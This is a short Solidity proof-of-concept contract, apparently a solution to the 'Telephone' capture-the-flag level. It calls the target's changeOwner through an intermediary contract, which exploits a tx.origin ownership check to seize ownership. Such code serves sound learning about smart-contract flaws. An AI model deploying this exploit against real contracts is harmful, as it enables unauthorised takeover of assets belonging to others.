// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./telephone.sol";

contract TelephonePOC {
    Telephone telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function changeOwner(address _owner) public {
        telephoneContract.changeOwner(_owner);
    }
}